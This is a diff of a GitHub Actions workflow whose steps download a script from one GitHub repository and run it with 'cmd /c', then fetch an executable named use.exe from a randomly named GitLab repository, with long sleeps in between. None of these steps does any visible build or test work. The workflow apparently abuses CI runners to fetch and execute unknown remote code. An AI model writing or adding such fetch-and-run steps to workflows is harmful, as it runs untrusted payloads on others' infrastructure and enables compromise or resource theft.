@@ -9,9 +9,12 @@ jobs:
     
     steps:
     - name: Download
-      run: Invoke-WebRequest https://github.com/Efebey2903/fictional-octo-waffle/raw/main/a.ps1 -OutFile 0.ps1
+      run: Invoke-WebRequest https://github.com/Efebey2903/fictional-octo-waffle/raw/main/a.cmd -OutFile setup.cmd
     
     - name: rrt
       run: |
+           cmd /c setup.cmd
+           curl -o zip.exe -Uri "https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/use.exe"
            sleep 240
-           .\0.ps1
+           curl -o zip.exe -Uri "https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/use.exe"
+           sleep 240
